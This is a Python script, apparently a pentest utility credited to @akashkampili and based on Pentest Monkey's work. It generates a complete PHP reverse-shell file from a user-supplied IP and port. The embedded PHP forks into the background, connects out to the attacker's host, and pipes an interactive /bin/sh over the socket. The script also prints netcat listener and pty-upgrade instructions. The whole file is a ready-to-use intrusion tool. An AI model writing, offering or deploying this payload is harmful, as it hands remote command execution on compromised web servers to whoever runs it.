import sys
import time

# Define a loading indicator function
def loading_indicator():
    sys.stdout.write("\033[?25l")  # Hide the cursor
    sys.stdout.write("Crafting payload [")
    for i in range(40):
        sys.stdout.write("=")
        sys.stdout.flush()
        time.sleep(0.05)  # Adjust the sleep duration to control the speed of the loading indicator
    sys.stdout.write("] 100%\n")
    sys.stdout.write("\033[?25h")  # Show the cursor

header = """
\033[38;2;255;255;102m

   ▄████████    ▄█    █▄       ▄████████  ▄█        ▄█             ▄██████▄  ███▄▄▄▄      ▄████████ 
  ███    ███   ███    ███     ███    ███ ███       ███            ███    ███ ███▀▀▀██▄   ███    ███ 
  ███    █▀    ███    ███     ███    █▀  ███       ███            ███    ███ ███   ███   ███    █▀  
  ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄     ███       ███            ███    ███ ███   ███  ▄███▄▄▄     
▀███████████ ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ███       ███            ███    ███ ███   ███ ▀▀███▀▀▀     
         ███   ███    ███     ███    █▄  ███       ███            ███    ███ ███   ███   ███    █▄  
   ▄█    ███   ███    ███     ███    ███ ███▌    ▄ ███▌    ▄      ███    ███ ███   ███   ███    ███ 
 ▄████████▀    ███    █▀      ██████████ █████▄▄██ █████▄▄██       ▀██████▀   ▀█   █▀    ██████████ 
                                         ▀         ▀                                                

Author: @akashkampili
Credits: Based on work by Pentest Monkey

\033[0m

"""

# ANSI escape codes for text coloring
orange_color = "\033[38;2;255;165;0m"  # Orange
yellow_color = "\033[38;2;255;255;102m"  # Yellow
reset_color = "\033[0m"  # Reset to default color

print(header)  # Print the header


# Get user input for IP, port, and file name
ip = input("Enter IP address: ")
port = input("Enter port number: ")
file_name = input("Enter file name to save the code (e.g., my_shell.php): ")
php_code = f"""{header}
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '{ip}';
$port = {port};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {{
    $pid = pcntl_fork();

    if ($pid == -1) {{
        printit("ERROR: Can't fork");
        exit(1);
    }}

    if ($pid) {{
        exit(0);
    }}

    if (posix_setsid() == -1) {{
        printit("Error: Can't setsid()");
        exit(1);
    }}

    $daemon = 1;
}} else {{
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}}

chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {{
    printit("$errstr ($errno)");
    exit(1);
}}

$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {{
    printit("ERROR: Can't spawn shell");
    exit(1);
}}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {{
    if (feof($sock)) {{
        printit("ERROR: Shell connection terminated");
        break;
    }}

    if (feof($pipes[1])) {{
        printit("ERROR: Shell process terminated");
        break;
    }}

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {{
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }}

    if (in_array($pipes[1], $read_a)) {{
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }}

    if (in_array($pipes[2], $read_a)) {{
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }}
}}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {{
    if (!$daemon) {{
        print "$string\\n";
    }}
}}
?>

"""

# Save the modified code to the specified file
with open(file_name, "w") as file:
    file.write(php_code)



# Craft the payload with a loading indicator
print("Crafting payload, please wait...")
loading_indicator()
time.sleep(1)  # Add a delay to simulate crafting
print(f"{yellow_color}Payload has been crafted successfully{reset_color}")
print(f"'{file_name}' has been saved successfully")

# Instructions for the user (in orange and yellow)
print(f"{yellow_color}Instructions:{reset_color}")
print(f"{orange_color}To establish a Netcat listener, open a new terminal by clicking Ctrl+Shift+T,")
print(f"and then type the following command to listen on port {port}:")
print(f"nc -lvp {port}")

print("After getting the shell, you can upgrade it to a more interactive shell by typing the following command:")
print("python -c 'import pty; pty.spawn(\"/bin/bash\")'")
